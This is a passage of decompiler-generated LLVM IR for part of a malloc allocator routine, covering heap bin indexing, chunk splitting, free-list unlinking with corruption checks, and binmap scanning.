dec_label_pc_13f90:                               ; preds = %dec_label_pc_13f88
  %v0_13f90 = load i32, i32* @sb, align 4
  %v1_13f90 = add i32 %v0_13f90, 48
  %v2_13f90 = inttoptr i32 %v1_13f90 to i32*
  %v3_13f90 = load i32, i32* %v2_13f90, align 4
  store i32 %v3_13f90, i32* %r3.global-to-local, align 4
  %v9_13f94 = icmp eq i32 %v3_140c0, %v3_13f90
  br i1 %v9_13f94, label %dec_label_pc_13f9c, label %dec_label_pc_13fdc

dec_label_pc_13f9c:                               ; preds = %dec_label_pc_13f90
  %v1_13f9c = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_13f7c, %v1_13f9c
  br i1 %tmp207, label %dec_label_pc_13fa4, label %dec_label_pc_13fdc

dec_label_pc_13fa4:                               ; preds = %dec_label_pc_13f9c
  %v2_13fa4 = sub i32 %v1_13f7c, %v0_13f78
  store i32 %v2_13fa4, i32* %r2.global-to-local, align 4
  %v2_13fa8 = add i32 %v0_13f78, %v3_140c0
  store i32 %v2_13fa8, i32* %r3.global-to-local, align 4
  %v1_13fac = or i32 %v0_13f78, 1
  store i32 %v1_13fac, i32* %r0.global-to-local, align 4
  %v1_13fb0 = or i32 %v2_13fa4, 1
  store i32 %v1_13fb0, i32* %r1.global-to-local, align 4
  %v1_13fb4 = add i32 %v3_140c0, 8
  store i32 %v1_13fb4, i32* %r4.global-to-local, align 4
  %v2_13fb8 = add i32 %v0_13fe0, 8
  %v3_13fb8 = inttoptr i32 %v2_13fb8 to i32*
  store i32 %v2_13fa8, i32* %v3_13fb8, align 4
  %v0_13fbc = load i32, i32* %r3.global-to-local, align 4
  %v1_13fbc = load i32, i32* %ip.global-to-local, align 4
  %v2_13fbc = add i32 %v1_13fbc, 12
  %v3_13fbc = inttoptr i32 %v2_13fbc to i32*
  store i32 %v0_13fbc, i32* %v3_13fbc, align 4
  %v0_13fc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_13fc0 = load i32, i32* @r6, align 4
  %v2_13fc0 = add i32 %v1_13fc0, 4
  %v3_13fc0 = inttoptr i32 %v2_13fc0 to i32*
  store i32 %v0_13fc0, i32* %v3_13fc0, align 4
  %v0_13fc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_13fc4 = load i32, i32* @sb, align 4
  %v2_13fc4 = add i32 %v1_13fc4, 48
  %v3_13fc4 = inttoptr i32 %v2_13fc4 to i32*
  store i32 %v0_13fc4, i32* %v3_13fc4, align 4
  %v0_13fc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13fc8 = load i32, i32* %r3.global-to-local, align 4
  %v3_13fc8 = add i32 %v1_13fc8, %v0_13fc8
  %v4_13fc8 = inttoptr i32 %v3_13fc8 to i32*
  store i32 %v0_13fc8, i32* %v4_13fc8, align 4
  %v0_13fcc = load i32, i32* %r1.global-to-local, align 4
  %v1_13fcc = load i32, i32* %r3.global-to-local, align 4
  %v2_13fcc = add i32 %v1_13fcc, 4
  %v3_13fcc = inttoptr i32 %v2_13fcc to i32*
  store i32 %v0_13fcc, i32* %v3_13fcc, align 4
  %v0_13fd0 = load i32, i32* %ip.global-to-local, align 4
  %v1_13fd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_13fd0 = add i32 %v1_13fd0, 12
  %v3_13fd0 = inttoptr i32 %v2_13fd0 to i32*
  store i32 %v0_13fd0, i32* %v3_13fd0, align 4
  %v0_13fd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_13fd4 = load i32, i32* %r3.global-to-local, align 4
  %v2_13fd4 = add i32 %v1_13fd4, 8
  %v3_13fd4 = inttoptr i32 %v2_13fd4 to i32*
  store i32 %v0_13fd4, i32* %v3_13fd4, align 4
  br label %dec_label_pc_14704

dec_label_pc_13fdc:                               ; preds = %dec_label_pc_13f9c, %dec_label_pc_13f90, %dec_label_pc_13f88, %dec_label_pc_13f74
  %v9_13fdc = icmp eq i32 %v1_13f7c, %v0_13f78
  %v2_13fe0 = add i32 %v3_13f80, 8
  %v3_13fe0 = inttoptr i32 %v2_13fe0 to i32*
  store i32 %v0_13fe0, i32* %v3_13fe0, align 4
  %v0_13fe4 = load i32, i32* %ip.global-to-local, align 4
  %v1_13fe4 = load i32, i32* %r5.global-to-local, align 4
  %v2_13fe4 = add i32 %v1_13fe4, 12
  %v3_13fe4 = inttoptr i32 %v2_13fe4 to i32*
  store i32 %v0_13fe4, i32* %v3_13fe4, align 4
  br i1 %v9_13fdc, label %dec_label_pc_1413c.loopexit, label %dec_label_pc_13ff8

dec_label_pc_13ff8:                               ; preds = %dec_label_pc_13fdc
  %v0_13ff8 = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_13ff8, 255
  br i1 %tmp208, label %dec_label_pc_1401c, label %dec_label_pc_14000

dec_label_pc_14000:                               ; preds = %dec_label_pc_13ff8
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  %v1_14004 = load i32, i32* %r8.global-to-local, align 4
  %v2_14004 = add i32 %v1_14004, ptrtoint (i32* @global_var_240f8.537 to i32)
  %v3_14004 = inttoptr i32 %v2_14004 to i32*
  %v4_14004 = load i32, i32* %v3_14004, align 4
  %v3_14008 = udiv i32 %v0_13ff8, 8
  store i32 %v3_14008, i32* %r0.global-to-local, align 4
  %v4_1400c = mul nuw i32 %v3_14008, 8
  %v5_1400c = add i32 %v4_14004, %v4_1400c
  store i32 %v5_1400c, i32* %r3.global-to-local, align 4
  %v1_14010 = add i32 %v5_1400c, 44
  store i32 %v1_14010, i32* %ip.global-to-local, align 4
  %v1_14014 = add i32 %v5_1400c, 52
  %v2_14014 = inttoptr i32 %v1_14014 to i32*
  %v3_14014 = load i32, i32* %v2_14014, align 4
  store i32 %v3_14014, i32* @lr, align 4
  br label %dec_label_pc_14074

dec_label_pc_1401c:                               ; preds = %dec_label_pc_13ff8
  store i32 %v0_13ff8, i32* %r0.global-to-local, align 4
  %v1_14020 = call i32 @__malloc_largebin_index(i32 %v0_13ff8)
  store i32 %v1_14020, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %ip.global-to-local, align 4
  %v1_14028 = load i32, i32* %r8.global-to-local, align 4
  %v2_14028 = add i32 %v1_14028, ptrtoint (i32* @global_var_240f8.537 to i32)
  %v3_14028 = inttoptr i32 %v2_14028 to i32*
  %v4_14028 = load i32, i32* %v3_14028, align 4
  %v4_1402c = mul i32 %v1_14020, 8
  %v5_1402c = add i32 %v4_14028, %v4_1402c
  store i32 %v5_1402c, i32* %r3.global-to-local, align 4
  %v1_14030 = add i32 %v5_1402c, 44
  store i32 %v1_14030, i32* %ip.global-to-local, align 4
  %v1_14034 = add i32 %v5_1402c, 52
  %v2_14034 = inttoptr i32 %v1_14034 to i32*
  %v3_14034 = load i32, i32* %v2_14034, align 4
  store i32 %v3_14034, i32* @lr, align 4
  %v9_14038 = icmp eq i32 %v3_14034, %v1_14030
  br i1 %v9_14038, label %dec_label_pc_14074, label %dec_label_pc_14040

dec_label_pc_14040:                               ; preds = %dec_label_pc_1401c
  %v1_14040 = add i32 %v5_1402c, 56
  %v2_14040 = inttoptr i32 %v1_14040 to i32*
  %v3_14040 = load i32, i32* %v2_14040, align 4
  store i32 %v3_14040, i32* %r1.global-to-local, align 4
  %v1_14044 = add i32 %v3_14040, 4
  %v2_14044 = inttoptr i32 %v1_14044 to i32*
  %v3_14044 = load i32, i32* %v2_14044, align 4
  store i32 %v3_14044, i32* %r3.global-to-local, align 4
  %v0_14048 = load i32, i32* %r4.global-to-local, align 4
  %v3_14048 = icmp ult i32 %v0_14048, %v3_14044
  br i1 %v3_14048, label %.thread, label %dec_label_pc_14064.preheader

.thread:                                          ; preds = %dec_label_pc_14040
  store i32 %v1_14030, i32* @lr, align 4
  store i32 %v3_14040, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14074

dec_label_pc_14064.preheader:                     ; preds = %dec_label_pc_14040
  %v2_14050 = or i32 %v0_14048, 1
  store i32 %v2_14050, i32* %r2.global-to-local, align 4
  %v1_14064182 = add i32 %v3_14034, 4
  %v2_14064183 = inttoptr i32 %v1_14064182 to i32*
  %v3_14064184 = load i32, i32* %v2_14064183, align 4
  store i32 %v3_14064184, i32* %r3.global-to-local, align 4
  %v3_14068186 = icmp ult i32 %v2_14050, %v3_14064184
  br i1 %v3_14068186, label %dec_label_pc_14060, label %dec_label_pc_14070

dec_label_pc_14060:                               ; preds = %dec_label_pc_14064.preheader, %dec_label_pc_14060
  %v0_14070187 = phi i32 [ %v3_14060, %dec_label_pc_14060 ], [ %v3_14034, %dec_label_pc_14064.preheader ]
  %v1_14060 = add i32 %v0_14070187, 8
  %v2_14060 = inttoptr i32 %v1_14060 to i32*
  %v3_14060 = load i32, i32* %v2_14060, align 4
  store i32 %v3_14060, i32* @lr, align 4
  %v1_14064 = add i32 %v3_14060, 4
  %v2_14064 = inttoptr i32 %v1_14064 to i32*
  %v3_14064 = load i32, i32* %v2_14064, align 4
  store i32 %v3_14064, i32* %r3.global-to-local, align 4
  %v3_14068 = icmp ult i32 %v2_14050, %v3_14064
  br i1 %v3_14068, label %dec_label_pc_14060, label %dec_label_pc_14070

dec_label_pc_14070:                               ; preds = %dec_label_pc_14060, %dec_label_pc_14064.preheader
  %v0_14070.lcssa = phi i32 [ %v3_14034, %dec_label_pc_14064.preheader ], [ %v3_14060, %dec_label_pc_14060 ]
  %v1_14070 = add i32 %v0_14070.lcssa, 12
  %v2_14070 = inttoptr i32 %v1_14070 to i32*
  %v3_14070 = load i32, i32* %v2_14070, align 4
  store i32 %v3_14070, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14074

dec_label_pc_14074:                               ; preds = %.thread, %dec_label_pc_1401c, %dec_label_pc_14000, %dec_label_pc_14070
  %v0_14094 = phi i32 [ %v1_14030, %dec_label_pc_1401c ], [ %v1_14010, %dec_label_pc_14000 ], [ %v3_14070, %dec_label_pc_14070 ], [ %v3_14040, %.thread ]
  %v0_14088 = phi i32 [ %v1_14020, %dec_label_pc_1401c ], [ %v3_14008, %dec_label_pc_14000 ], [ %v1_14020, %dec_label_pc_14070 ], [ %v1_14020, %.thread ]
  %v1_14078 = phi i32 [ %v1_14028, %dec_label_pc_1401c ], [ %v1_14004, %dec_label_pc_14000 ], [ %v1_14028, %dec_label_pc_14070 ], [ %v1_14028, %.thread ]
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  %v2_14078 = add i32 %v1_14078, ptrtoint (i32* @global_var_240f8.537 to i32)
  %v3_14078 = inttoptr i32 %v2_14078 to i32*
  %v4_14078 = load i32, i32* %v3_14078, align 4
  %v3_1407c = sdiv i32 %v0_14088, 32
  store i32 %v3_1407c, i32* %r3.global-to-local, align 4
  %v4_14080 = mul nsw i32 %v3_1407c, 4
  %v5_14080 = add i32 %v4_14078, %v4_14080
  store i32 %v5_14080, i32* %r1.global-to-local, align 4
  %v1_14084 = add i32 %v5_14080, 820
  %v2_14084 = inttoptr i32 %v1_14084 to i32*
  %v3_14084 = load i32, i32* %v2_14084, align 4
  %v1_14088 = urem i32 %v0_14088, 32
  store i32 %v1_14088, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_14090 = shl i32 1, %v1_14088
  %v8_14090 = or i32 %v3_14084, %v7_14090
  store i32 %v8_14090, i32* %r3.global-to-local, align 4
  %v1_14094 = load i32, i32* @r6, align 4
  %v2_14094 = add i32 %v1_14094, 12
  %v3_14094 = inttoptr i32 %v2_14094 to i32*
  store i32 %v0_14094, i32* %v3_14094, align 4
  %v0_14098 = load i32, i32* @lr, align 4
  %v1_14098 = load i32, i32* @r6, align 4
  %v2_14098 = add i32 %v1_14098, 8
  %v3_14098 = inttoptr i32 %v2_14098 to i32*
  store i32 %v0_14098, i32* %v3_14098, align 4
  %v0_1409c = load i32, i32* %r3.global-to-local, align 4
  %v1_1409c = load i32, i32* %r1.global-to-local, align 4
  %v2_1409c = add i32 %v1_1409c, 820
  %v3_1409c = inttoptr i32 %v2_1409c to i32*
  store i32 %v0_1409c, i32* %v3_1409c, align 4
  %v0_140a0 = load i32, i32* @r6, align 4
  %v1_140a0 = load i32, i32* @lr, align 4
  %v2_140a0 = add i32 %v1_140a0, 12
  %v3_140a0 = inttoptr i32 %v2_140a0 to i32*
  store i32 %v0_140a0, i32* %v3_140a0, align 4
  %v0_140a4 = load i32, i32* @r6, align 4
  %v1_140a4 = load i32, i32* %ip.global-to-local, align 4
  %v2_140a4 = add i32 %v1_140a4, 8
  %v3_140a4 = inttoptr i32 %v2_140a4 to i32*
  store i32 %v0_140a4, i32* %v3_140a4, align 4
  %v0_140c0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_140c0

dec_label_pc_140ac:                               ; preds = %dec_label_pc_13f4c, %dec_label_pc_13f04, %dec_label_pc_13f60
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r1.global-to-local, align 4
  %v4_140b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_140b4, i32* @sb, align 4
  %v0_140b8 = load i32, i32* @sl, align 4
  %v1_140b8 = add i32 %v0_140b8, 16
  store i32 %v1_140b8, i32* @fp, align 4
  %v1_140bc = add i32 %v4_140b4, 52
  store i32 %v1_140bc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_140c0

dec_label_pc_140c0:                               ; preds = %dec_label_pc_14074, %dec_label_pc_140ac
  %v0_13fe0 = phi i32 [ %v0_140c0.pre, %dec_label_pc_14074 ], [ %v1_140bc, %dec_label_pc_140ac ]
  %v1_140c0 = add i32 %v0_13fe0, 12
  %v2_140c0 = inttoptr i32 %v1_140c0 to i32*
  %v3_140c0 = load i32, i32* %v2_140c0, align 4
  store i32 %v3_140c0, i32* @r6, align 4
  %v9_140c4 = icmp eq i32 %v3_140c0, %v0_13fe0
  br i1 %v9_140c4, label %dec_label_pc_140cc, label %dec_label_pc_13f74

dec_label_pc_140cc:                               ; preds = %dec_label_pc_140c0
  %v0_140cc = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_140cc, 256
  %v0_14184.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_140cc.dec_label_pc_14184_crit_edge, label %dec_label_pc_140d4

dec_label_pc_140cc.dec_label_pc_14184_crit_edge:  ; preds = %dec_label_pc_140cc
  %.pre203 = mul i32 %v0_14184.pre, 8
  br label %dec_label_pc_14184

dec_label_pc_140d4:                               ; preds = %dec_label_pc_140cc
  %v4_140d4 = mul i32 %v0_14184.pre, 8
  %v5_140d4 = add i32 %v4_140d4, %v0_13fe0
  store i32 %v5_140d4, i32* %r3.global-to-local, align 4
  %v1_140d8 = add i32 %v5_140d4, -8
  store i32 %v1_140d8, i32* %r1.global-to-local, align 4
  %v1_140dc = add i32 %v5_140d4, 4
  %v2_140dc = inttoptr i32 %v1_140dc to i32*
  %storemerge.pre = load i32, i32* %v2_140dc, align 4
  br label %dec_label_pc_1417c

dec_label_pc_140e4:                               ; preds = %dec_label_pc_1417c
  %v1_140e4 = add i32 %v1_1410c, 4
  %v2_140e4 = inttoptr i32 %v1_140e4 to i32*
  %v3_140e4 = load i32, i32* %v2_140e4, align 4
  store i32 %v3_140e4, i32* %r3.global-to-local, align 4
  %v1_140e8 = and i32 %v3_140e4, -4
  store i32 %v1_140e8, i32* %r2.global-to-local, align 4
  %v3_140ec = icmp ult i32 %v1_140e8, %v0_140cc
  %v1_140f0 = add i32 %v1_1410c, 12
  %v2_140f0 = inttoptr i32 %v1_140f0 to i32*
  %v3_140f0 = load i32, i32* %v2_140f0, align 4
  store i32 %v3_140f0, i32* %r0.global-to-local, align 4
  br i1 %v3_140ec, label %dec_label_pc_1417c, label %dec_label_pc_140f8

dec_label_pc_140f8:                               ; preds = %dec_label_pc_140e4
  %v1_140f8 = add i32 %v1_1410c, 8
  %v2_140f8 = inttoptr i32 %v1_140f8 to i32*
  %v3_140f8 = load i32, i32* %v2_140f8, align 4
  store i32 %v3_140f8, i32* %r1.global-to-local, align 4
  %v1_140fc = add i32 %v3_140f8, 12
  %v2_140fc = inttoptr i32 %v1_140fc to i32*
  %v3_140fc = load i32, i32* %v2_140fc, align 4
  store i32 %v3_140fc, i32* %r3.global-to-local, align 4
  %v9_14100 = icmp eq i32 %v3_140fc, %v1_1410c
  br i1 %v9_14100, label %dec_label_pc_14108, label %dec_label_pc_14114

dec_label_pc_14108:                               ; preds = %dec_label_pc_140f8
  %v1_14108 = add i32 %v3_140f0, 8
  %v2_14108 = inttoptr i32 %v1_14108 to i32*
  %v3_14108 = load i32, i32* %v2_14108, align 4
  store i32 %v3_14108, i32* %r3.global-to-local, align 4
  %v9_1410c = icmp eq i32 %v3_14108, %v1_1410c
  br i1 %v9_1410c, label %dec_label_pc_14118, label %dec_label_pc_14114

dec_label_pc_14114:                               ; preds = %dec_label_pc_140f8, %dec_label_pc_14108
  %v0_14114 = call i32 @abort()
  store i32 %v0_14114, i32* %r0.global-to-local, align 4
  %v0_14118.pre = load i32, i32* @sl, align 4
  %v1_14118.pre = load i32, i32* @r2, align 4
  %v0_14120.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14118

dec_label_pc_14118:                               ; preds = %dec_label_pc_14108, %dec_label_pc_14114
  %v1_14120 = phi i32 [ %v3_140f0, %dec_label_pc_14108 ], [ %v0_14114, %dec_label_pc_14114 ]
  %v0_14120 = phi i32 [ %v3_140f8, %dec_label_pc_14108 ], [ %v0_14120.pre, %dec_label_pc_14114 ]
  %v1_14118 = phi i32 [ %v1_140e8, %dec_label_pc_14108 ], [ %v1_14118.pre, %dec_label_pc_14114 ]
  %v0_14118 = phi i32 [ %v0_140cc, %dec_label_pc_14108 ], [ %v0_14118.pre, %dec_label_pc_14114 ]
  %v2_14118 = sub i32 %v1_14118, %v0_14118
  store i32 %v2_14118, i32* %lr.global-to-local, align 4
  %v2_14120 = add i32 %v1_14120, 8
  %v3_14120 = inttoptr i32 %v2_14120 to i32*
  store i32 %v0_14120, i32* %v3_14120, align 4
  %v0_14124 = load i32, i32* %r0.global-to-local, align 4
  %v1_14124 = load i32, i32* %r1.global-to-local, align 4
  %v2_14124 = add i32 %v1_14124, 12
  %v3_14124 = inttoptr i32 %v2_14124 to i32*
  store i32 %v0_14124, i32* %v3_14124, align 4
  %v0_14128 = load i32, i32* %ip.global-to-local, align 4
  %v1_14128 = add i32 %v0_14128, 8
  store i32 %v1_14128, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_14118, 15
  br i1 %tmp210, label %dec_label_pc_14148, label %dec_label_pc_14130

dec_label_pc_14130:                               ; preds = %dec_label_pc_14118
  %v1_14130 = load i32, i32* %r2.global-to-local, align 4
  %v2_14130 = add i32 %v1_14130, %v0_14128
  store i32 %v2_14130, i32* %r2.global-to-local, align 4
  %v1_14134 = add i32 %v2_14130, 4
  %v2_14134 = inttoptr i32 %v1_14134 to i32*
  %v3_14134 = load i32, i32* %v2_14134, align 4
  store i32 %v3_14134, i32* %r3.global-to-local, align 4
  store i32 %v1_14128, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1413c

dec_label_pc_1413c.loopexit:                      ; preds = %dec_label_pc_13fdc
  %v1_13fe8 = load i32, i32* @r6, align 4
  %v2_13fe8 = load i32, i32* @sl, align 4
  %v3_13fe8 = add i32 %v2_13fe8, %v1_13fe8
  store i32 %v3_13fe8, i32* %r2.global-to-local, align 4
  %v2_13fec = add i32 %v3_13fe8, 4
  %v3_13fec = inttoptr i32 %v2_13fec to i32*
  %v4_13fec = load i32, i32* %v3_13fec, align 4
  store i32 %v4_13fec, i32* %r3.global-to-local, align 4
  %v2_13ff0 = add i32 %v1_13fe8, 8
  store i32 %v2_13ff0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1413c

dec_label_pc_1413c:                               ; preds = %.dec_label_pc_1413c_crit_edge, %dec_label_pc_1413c.loopexit, %dec_label_pc_14130
  %v1_14140 = phi i32 [ %v4_14264, %.dec_label_pc_1413c_crit_edge ], [ %v3_13fe8, %dec_label_pc_1413c.loopexit ], [ %v2_14130, %dec_label_pc_14130 ]
  %v0_1413c = phi i32 [ %v7_14264, %.dec_label_pc_1413c_crit_edge ], [ %v4_13fec, %dec_label_pc_1413c.loopexit ], [ %v3_14134, %dec_label_pc_14130 ]
  %v1_1413c = or i32 %v0_1413c, 1
  store i32 %v1_1413c, i32* %r3.global-to-local, align 4
  %v2_14140 = add i32 %v1_14140, 4
  %v3_14140 = inttoptr i32 %v2_14140 to i32*
  store i32 %v1_1413c, i32* %v3_14140, align 4
  br label %dec_label_pc_14704

dec_label_pc_14148:                               ; preds = %dec_label_pc_14118
  %v1_14148 = load i32, i32* @sl, align 4
  %v2_14148 = add i32 %v1_14148, %v0_14128
  store i32 %v2_14148, i32* %r2.global-to-local, align 4
  %v1_1414c = or i32 %v1_14148, 1
  store i32 %v1_1414c, i32* %r3.global-to-local, align 4
  %v0_14150 = load i32, i32* %lr.global-to-local, align 4
  %v1_14150 = or i32 %v0_14150, 1
  store i32 %v1_14150, i32* %r1.global-to-local, align 4
  store i32 %v1_14128, i32* %r4.global-to-local, align 4
  %v2_14158 = add i32 %v0_14128, 4
  %v3_14158 = inttoptr i32 %v2_14158 to i32*
  store i32 %v1_1414c, i32* %v3_14158, align 4
  %v0_1415c = load i32, i32* %r2.global-to-local, align 4
  %v1_1415c = load i32, i32* @r6, align 4
  %v2_1415c = add i32 %v1_1415c, 8
  %v3_1415c = inttoptr i32 %v2_1415c to i32*
  store i32 %v0_1415c, i32* %v3_1415c, align 4
  %v0_14160 = load i32, i32* %r2.global-to-local, align 4
  %v1_14160 = load i32, i32* @r6, align 4
  %v2_14160 = add i32 %v1_14160, 12
  %v3_14160 = inttoptr i32 %v2_14160 to i32*
  store i32 %v0_14160, i32* %v3_14160, align 4
  %v0_14164 = load i32, i32* %lr.global-to-local, align 4
  %v1_14164 = load i32, i32* %r2.global-to-local, align 4
  %v3_14164 = add i32 %v1_14164, %v0_14164
  %v4_14164 = inttoptr i32 %v3_14164 to i32*
  store i32 %v0_14164, i32* %v4_14164, align 4
  %v0_14168 = load i32, i32* %r1.global-to-local, align 4
  %v1_14168 = load i32, i32* %r2.global-to-local, align 4
  %v2_14168 = add i32 %v1_14168, 4
  %v3_14168 = inttoptr i32 %v2_14168 to i32*
  store i32 %v0_14168, i32* %v3_14168, align 4
  %v0_1416c = load i32, i32* @r6, align 4
  %v1_1416c = load i32, i32* %r2.global-to-local, align 4
  %v2_1416c = add i32 %v1_1416c, 12
  %v3_1416c = inttoptr i32 %v2_1416c to i32*
  store i32 %v0_1416c, i32* %v3_1416c, align 4
  %v0_14170 = load i32, i32* @r6, align 4
  %v1_14170 = load i32, i32* %r2.global-to-local, align 4
  %v2_14170 = add i32 %v1_14170, 8
  %v3_14170 = inttoptr i32 %v2_14170 to i32*
  store i32 %v0_14170, i32* %v3_14170, align 4
  br label %dec_label_pc_14704

dec_label_pc_1417c:                               ; preds = %dec_label_pc_140e4, %dec_label_pc_140d4
  %v1_1410c = phi i32 [ %storemerge.pre, %dec_label_pc_140d4 ], [ %v3_140f0, %dec_label_pc_140e4 ]
  store i32 %v1_1410c, i32* %ip.global-to-local, align 4
  %v9_1417c = icmp eq i32 %v1_1410c, %v1_140d8
  br i1 %v9_1417c, label %dec_label_pc_14184.loopexit, label %dec_label_pc_140e4

dec_label_pc_14184.loopexit:                      ; preds = %dec_label_pc_1417c
  br label %dec_label_pc_14184

dec_label_pc_14184:                               ; preds = %dec_label_pc_140cc.dec_label_pc_14184_crit_edge, %dec_label_pc_14184.loopexit
  %v4_141b4.pre-phi = phi i32 [ %.pre203, %dec_label_pc_140cc.dec_label_pc_14184_crit_edge ], [ %v4_140d4, %dec_label_pc_14184.loopexit ]
  %v1_14184 = add i32 %v0_14184.pre, 1
  store i32 %v1_14184, i32* %r2.global-to-local, align 4
  %v1_14188 = urem i32 %v1_14184, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r0.global-to-local, align 4
  %v6_14194 = shl i32 1, %v1_14188
  store i32 %v6_14194, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1419c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_1419c, i32* %r3.global-to-local, align 4
  %v3_141a0 = udiv i32 %v1_14184, 32
  store i32 %v3_141a0, i32* @r5, align 4
  %v4_141a4 = mul nuw nsw i32 %v3_141a0, 4
  %v5_141a4 = add i32 %v4_1419c, %v4_141a4
  store i32 %v5_141a4, i32* %r2.global-to-local, align 4
  %v1_141a8 = add i32 %v5_141a4, 820
  %v2_141a8 = inttoptr i32 %v1_141a8 to i32*
  %v3_141a8 = load i32, i32* %v2_141a8, align 4
  store i32 %v3_141a8, i32* @r4, align 4
  %v1_141ac = add i32 %v4_1419c, 52
  store i32 %v1_141ac, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_141b4 = add i32 %v1_141ac, %v4_141b4.pre-phi
  store i32 %v5_141b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_141b8

dec_label_pc_141b8:                               ; preds = %dec_label_pc_14220, %dec_label_pc_14184
  %v1_141c0 = phi i32 [ %v1_141c0.pre, %dec_label_pc_14220 ], [ %v3_141a8, %dec_label_pc_14184 ]
  %v0_141c0 = phi i32 [ %v0_141b8.pre, %dec_label_pc_14220 ], [ %v6_14194, %dec_label_pc_14184 ]
  %v1_141b8 = sub i32 1, %v0_141c0
  %v2_141b8 = icmp ult i32 %v0_141c0, 2
  %v1_141b8. = select i1 %v2_141b8, i32 %v1_141b8, i32 0
  store i32 %v1_141b8., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_141c0, %v1_141c0
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_141b8
  %v5_141c4 = or i32 %v1_141b8., 1
  store i32 %v5_141c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_141d0.preheader

bb145:                                            ; preds = %dec_label_pc_141b8
  %v2_141c8 = icmp eq i32 %v1_141b8., 0
  br i1 %v2_141c8, label %.dec_label_pc_1420c.preheader_crit_edge, label %dec_label_pc_141d0.preheader

.dec_label_pc_1420c.preheader_crit_edge:          ; preds = %bb145
  %v0_1420457.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1420c.preheader

dec_label_pc_141d0.preheader:                     ; preds = %bb145, %.thread15
  %v0_141d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_141d0

dec_label_pc_141d0:                               ; preds = %dec_label_pc_141d0.preheader, %dec_label_pc_141dc
  %v0_141d0 = phi i32 [ %v0_141d0.pre, %dec_label_pc_141d0.preheader ], [ %v1_141d0, %dec_label_pc_141dc ]
  %v1_141d0 = add i32 %v0_141d0, 1
  store i32 %v1_141d0, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_141d0, 2
  br i1 %tmp211, label %dec_label_pc_142b0.loopexit, label %dec_label_pc_141dc

dec_label_pc_141dc:                               ; preds = %dec_label_pc_141d0
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r3.global-to-local, align 4
  %v1_141e0 = load i32, i32* @r8, align 4
  %v2_141e0 = add i32 %v1_141e0, ptrtoint (i32* @global_var_240f8.537 to i32)
  %v3_141e0 = inttoptr i32 %v2_141e0 to i32*
  %v4_141e0 = load i32, i32* %v3_141e0, align 4
  store i32 %v4_141e0, i32* %r2.global-to-local, align 4
  %v4_141e4 = mul i32 %v1_141d0, 4
  %v5_141e4 = add i32 %v4_141e0, %v4_141e4
  store i32 %v5_141e4, i32* %r3.global-to-local, align 4
  %v1_141e8 = add i32 %v5_141e4, 820
  %v2_141e8 = inttoptr i32 %v1_141e8 to i32*
  %v3_141e8 = load i32, i32* %v2_141e8, align 4
  store i32 %v3_141e8, i32* @r4, align 4
  %v2_141ec = icmp eq i32 %v3_141e8, 0
  br i1 %v2_141ec, label %dec_label_pc_141d0, label %dec_label_pc_141f4

dec_label_pc_141f4:                               ; preds = %dec_label_pc_141dc
  %v4_141f4 = mul i32 %v1_141d0, 256
  %v5_141f4 = add i32 %v4_141e0, %v4_141f4
  store i32 %v5_141f4, i32* %r3.global-to-local, align 4
  %v1_141f8 = add i32 %v5_141f4, 44
  store i32 %v1_141f8, i32* %r0.global-to-local, align 4
  %v0_141fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_141fc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1420c.preheader

dec_label_pc_1420c.preheader:                     ; preds = %.dec_label_pc_1420c.preheader_crit_edge, %dec_label_pc_141f4
  %v0_1420457 = phi i32 [ %v1_141f8, %dec_label_pc_141f4 ], [ %v0_1420457.pre, %.dec_label_pc_1420c.preheader_crit_edge ]
  %v0_14228 = phi i32 [ %v3_141e8, %dec_label_pc_141f4 ], [ %v1_141c0, %.dec_label_pc_1420c.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_141fc, %dec_label_pc_141f4 ], [ %v0_141c0, %.dec_label_pc_1420c.preheader_crit_edge ]
  %v2_1420c54 = and i32 %ip.promoted, %v0_14228
  %v4_1420c56 = icmp eq i32 %v2_1420c54, 0
  br i1 %v4_1420c56, label %dec_label_pc_14204, label %dec_label_pc_14214

